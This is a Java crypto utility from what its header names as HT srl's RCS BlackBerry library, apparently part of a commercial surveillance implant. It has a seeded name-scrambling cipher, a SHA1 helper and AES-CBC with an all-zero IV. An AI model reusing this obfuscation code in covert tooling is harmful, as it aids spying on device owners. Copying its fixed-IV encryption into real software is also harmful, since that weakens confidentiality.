/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Encryption.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.crypto;

import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.Arrays;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

public class Encryption {

    //#debug
    private static Debug debug = new Debug("Encryption", DebugLevel.VERBOSE);

    /**
     * Descrambla una stringa, torna il puntatore al nome descramblato. La
     * stringa ritornata va liberata dal chiamante con una free()!!!!
     */
    public static String decryptName(final String Name, final int seed) {
        return scramble(Name, seed, false);
    }

    /**
     * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
     * ritornata va liberata dal chiamante con una free()!!!!
     */
    public static String encryptName(final String Name, final int seed) {
        return scramble(Name, seed, true);
    }

    public static int getNextMultiple(final int len) {
        // #ifdef DBC
        Check.requires(len >= 0, "len < 0");
        // #endif
        final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
        // #ifdef DBC
        Check.ensures(newlen >= len, "newlen < len");
        // #endif
        // #ifdef DBC
        Check.ensures(newlen % 16 == 0, "Wrong newlen");
        // #endif
        return newlen;
    }

    /**
     * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
     * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
     * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
     * a FALSE descrambla.
     */
    private static String scramble(final String name, int seed,
            final boolean enc) {
        final char[] retString = name.toCharArray();
        final int len = name.length();
        int i, j;

        final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T',
                'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4',
                'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l',
                'J', 'W', 'h', 'j', '0', 'm', '5', 'o', '2', 'E', 'r', 'L',
                't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
                'P', 'p', 'c', '7', 'g', '-', 'C' };

        final int alphabetLen = alphabet.length;

        if (seed < 0) {
            seed = -seed;
        }

        // Evita di lasciare i nomi originali anche se il byte e' 0
        seed = (seed > 0) ? seed %= alphabetLen : seed;

        if (seed == 0) {
            seed = 1;
        }

        // #ifdef DBC
        Check.asserts(seed > 0, "negative seed");
        // #endif

        for (i = 0; i < len; i++) {
            for (j = 0; j < alphabetLen; j++) {
                if (retString[i] == alphabet[j]) {
                    // Se crypt e' TRUE cifra, altrimenti decifra
                    if (enc) {
                        retString[i] = alphabet[(j + seed) % alphabetLen];
                    } else {
                        retString[i] = alphabet[(j + alphabetLen - seed)
                                % alphabetLen];
                    }

                    break;
                }
            }
        }

        return new String(retString);
    }

    CryptoEngine aes;

    boolean keyReady = false;

    private static boolean RimAESSupported;

    public static void init() {
        RimAESSupported = RimAES.isSupported();
        if (RimAESSupported) {
            // #debug info
	debug.info("RimAES");
        } else {
            // #debug info
	debug.info("Rijndael");
        }
    }

    /**
     * Calcola il SHA1 del messaggio, usando la crypto api
     * 
     * @param message
     * @return
     */
    public static byte[] SHA1(final byte[] message) {
        final SHA1Digest digest = new SHA1Digest();
        digest.update(message);
        final byte[] sha1 = digest.getDigest();

        // #debug debug
	debug.trace("SHA1: " + Utils.byteArrayToHex(sha1));
        return sha1;
    }

    public Encryption() {

        if (RimAESSupported) {
            aes = new RimAES();
        } else {
            aes = new Rijndael();
        }
    }

    public byte[] decryptData(final byte[] cyphered) {
        return decryptData(cyphered, cyphered.length, 0);
    }

    public byte[] decryptData(final byte[] cyphered, final int offset) {
        return decryptData(cyphered, cyphered.length - offset, offset);
    }

    public byte[] decryptData(final byte[] cyphered, final int plainlen,
            final int offset) {
        final int enclen = cyphered.length - offset;

        // #ifdef DBC
        Check.requires(keyReady, "Key not ready");
        // #endif
        // #ifdef DBC
        Check.requires(enclen % 16 == 0, "Wrong padding");
        // #endif
        // #ifdef DBC
        Check.requires(enclen >= plainlen, "Wrong plainlen");
        // #endif

        final byte[] plain = new byte[plainlen];
        byte[] iv = new byte[16];

        final byte[] pt = new byte[16];

        final int numblock = enclen / 16;
        final int lastBlockLen = plainlen % 16;
        try {
            for (int i = 0; i < numblock; i++) {
                final byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);

                aes.decrypt(ct, pt);
                xor(pt, iv);
                iv = Arrays.copy(ct);

                if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
                    // and remaind
                    // #debug debug
	debug.trace("lastBlockLen: " + lastBlockLen);
                    Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
                } else {
                    Utils.copy(plain, i * 16, pt, 0, 16);
                    // copyblock(plain, i, pt, 0);
                }
            }
        } catch (final CryptoTokenException e) {
            // #debug
            debug.error("error decrypting data");
            return null;
        }

        // #ifdef DBC
        Check.ensures(plain.length == plainlen, "wrong plainlen");
        // #endif
        return plain;
    }

    public byte[] encryptData(final byte[] plain) {
        // #ifdef DBC
        Check.requires(keyReady, "Key not ready");
        // #endif

        final int len = plain.length;
        final int clen = getNextMultiple(len);

        // TODO: optimize, non creare padplain, considerare caso particolare
        // ultimo blocco
        final byte[] padplain = new byte[clen];

        final byte[] crypted = new byte[clen];

        Utils.copy(padplain, plain, len);

        byte[] iv = new byte[16]; // iv e' sempre 0

        final byte[] ct = new byte[16];

        final int numblock = clen / 16;
        try {

            for (int i = 0; i < numblock; i++) {
                final byte[] pt = Arrays.copy(padplain, i * 16, 16);
                xor(pt, iv);

                aes.encrypt(pt, ct);

                Utils.copy(crypted, i * 16, ct, 0, 16);

                iv = Arrays.copy(ct);
            }
        } catch (final CryptoTokenException e) {
            // #debug
            debug.error("error crypting data");
            return null;
        }

        return crypted;
    }

    public void makeKey(final byte[] key) {
        // #ifdef DBC
        Check.requires(key != null, "key null");
        // #endif
        // #ifdef DBC
        Check.requires(key.length == 16, "key not 16 bytes long");
        // #endif
        aes.makeKey(key, 128);

        keyReady = true;
    }

    void xor(final byte[] pt, final byte[] iv) {
        // #ifdef DBC
        Check.requires(pt.length == 16, "pt not 16 bytes long");
        // #endif
        // #ifdef DBC
        Check.requires(iv.length == 16, "iv not 16 bytes long");
        // #endif

        for (int i = 0; i < 16; i++) {
            pt[i] ^= iv[i];
        }
    }

}
